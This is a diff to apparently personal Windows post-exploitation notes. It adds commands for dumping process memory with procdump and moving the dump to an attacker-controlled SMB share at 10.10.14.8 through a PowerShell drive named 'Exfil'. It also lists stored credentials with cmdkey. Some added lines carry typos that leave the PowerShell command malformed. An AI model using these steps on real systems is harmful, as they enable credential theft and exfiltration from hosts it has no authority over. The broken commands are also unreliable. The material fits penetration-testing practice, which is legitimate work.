@@ -1,4 +1,4 @@
-# Windows Escaltion
+# Windows Enumeration
 
 ## Gather Network Information
 
@@ -53,7 +53,7 @@
 
 			.\procdump.exe -ma <process_id> <output_file>
 		
-		We can use an smb share to download the output_file:
+		We can use an smb share to download the output_file in cmd:
 
 			on our local machine we do
 
@@ -63,11 +63,19 @@
 
 			on the remote machine we do
 
-			net use x: \\<our_local_ip>\share /user:guest guest
+			net use x: \\<our_local_ip>\share /user:guest guest #
 
 			and now we copy the dump file
 
 			cmd /c "copy <filen_name>.dmp X:\"
+
+		We can do the same in powershell:
+
+			impackter-smbserver.py -smb2support share <path_to_folder_we_want_to_share>
+
+			in powershell
+
+			New-PSDrive -Name Exfil -PSProvider -FileSystem -Root "\\10.10.14.8\share"
 
 	cmdkey /list	Lists stored credentials
 
